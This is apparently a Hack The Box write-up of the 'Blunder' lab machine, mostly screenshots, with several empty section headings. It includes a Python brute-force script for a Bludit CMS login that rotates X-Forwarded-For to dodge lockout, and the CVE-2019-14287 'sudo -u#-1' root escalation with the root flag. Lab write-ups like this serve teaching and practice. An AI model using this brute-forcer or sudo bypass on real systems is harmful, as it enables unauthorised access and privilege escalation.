---
layout: single
title: Blunder - Hack The Box
excerpt: "Blunder was an easy box for beginners that required bruteforcing the login for a Bludit CMS, then exploiting a known CVE through Metasploit to get remote code execution. The priv esc is a neat little CVE with sudo that allows us to execute commands as root even though the root username is supposed to be blocked."
date: 2022-11-17
classes: wide
header:
  teaser: /assets/images/htb-blunder/blunder_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - linux
  - bludit
  - wordlist
  - cewl
  - bruteforce
  - sudo
---
![](/assets/images/htb-blunder/blunder_logo.png)

![](/assets/images/htb-blunder/ping_initial.png)

![](/assets/images/htb-blunder/nmap_ports.png)

![](/assets/images/htb-blunder/file_allports.png)

![](/assets/images/htb-blunder/extract_ports.png)

![](/assets/images/htb-blunder/nmap_services.png)

![](/assets/images/htb-blunder/whatweb.png)

![](/assets/images/htb-blunder/searchsploit.png)

![](/assets/images/htb-blunder/webapp.png)

![](/assets/images/htb-blunder/wfuzz_admin.png)

![](/assets/images/htb-blunder/wfuzz_txt.png)

![](/assets/images/htb-blunder/todo_txt.png)

![](/assets/images/htb-blunder/bludit_login.png)

![](/assets/images/htb-blunder/login_admin.png)

![](/assets/images/htb-blunder/cewl_commnad.png)

![](/assets/images/htb-blunder/dictionary.png)

![](/assets/images/htb-blunder/take_token.png)

![](/assets/images/htb-blunder/burpsuite.png)

![](/assets/images/htb-blunder/password_correct.png)

![](/assets/images/htb-blunder/login_correct.png)

![](/assets/images/htb-blunder/searchsploit.png)

![](/assets/images/htb-blunder/evil_png.png)

![](/assets/images/htb-blunder/exploit_evil_png.png)

![](/assets/images/htb-blunder/exploit_png.png)

![](/assets/images/htb-blunder/exploit_png_data.png)

![](/assets/images/htb-blunder/upload_png.png)

![](/assets/images/htb-blunder/command_execu.png)

![](/assets/images/htb-blunder/netcat_listening.png)

![](/assets/images/htb-blunder/reverse_shell_command.png)

![](/assets/images/htb-blunder/netcat_correct.png)

![](/assets/images/htb-blunder/database_user.png)

![](/assets/images/htb-blunder/hash_password.png)

![](/assets/images/htb-blunder/crackstation.png)

![](/assets/images/htb-blunder/hugo_login.png)

![](/assets/images/htb-blunder/user_flag.png)

![](/assets/images/htb-blunder/shaun_bash.png)

![](/assets/images/htb-blunder/sudo_l.png)

![](/assets/images/htb-blunder/sudo_version.png)

![](/assets/images/htb-blunder/cve.png)

![](/assets/images/htb-blunder/exploit.png)

![](/assets/images/htb-blunder/root_flag.png)

Blunder was an easy box for beginners that required bruteforcing the login for a Bludit CMS, then exploiting a known CVE through Metasploit to get remote code execution. The priv esc is a neat little CVE with sudo that allows us to execute commands as root even though the root username is supposed to be blocked.

## Portscan

```python
#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, sys, time, re

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://10.10.10.191/admin/login"

def bruteForce():
    s = requests.session()

    f = open("dictionary.txt", "r")

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    counter = 1

    for password in f.readlines():
        #Remove the \n from the potential password
        password = password.strip('\n')

        p1.status("Probrando la contraseña [%d/349] : %s" % (counter,password))

        r = s.get(main_url)

        token = re.findall('name="tokenCSRF" value="(.*?)"',r.text)[0]
        post_data = {
            'tokenCSRF': token,
            'username': 'fergus',
            'password': '%s' % password,
            'save': ''
        }

        headers = {
            'X-Forwarded-For': '%s' % password
        }

        r = s.post(main_url, data=post_data, headers=headers)

        counter += 1

        if "Username or password incorrect" not in r.text:
            p1.success("La contraseña es -> %s" % password)
            break

if __name__ == '__main__':

    bruteForce()
```

```
snowscan@kali:~$ sudo nmap -sC -sV -F 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:29 EDT
Nmap scan report for blunder.htb (10.10.10.191)
Host is up (0.63s latency).
Not shown: 98 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds
```
## Website CMS

## Getting a shell

## Access to user hugo

## Privesc

However, because of CVE-2019-14287 in sudo, we can bypass the username check by using `#-1` and we get a root shell.
```
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@blunder:/home/hugo# id
id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
root@blunder:/home/hugo# cat /root/root.txt
cat /root/root.txt
5d649f5bcb1be5f93702a7a71cd4d77e
```
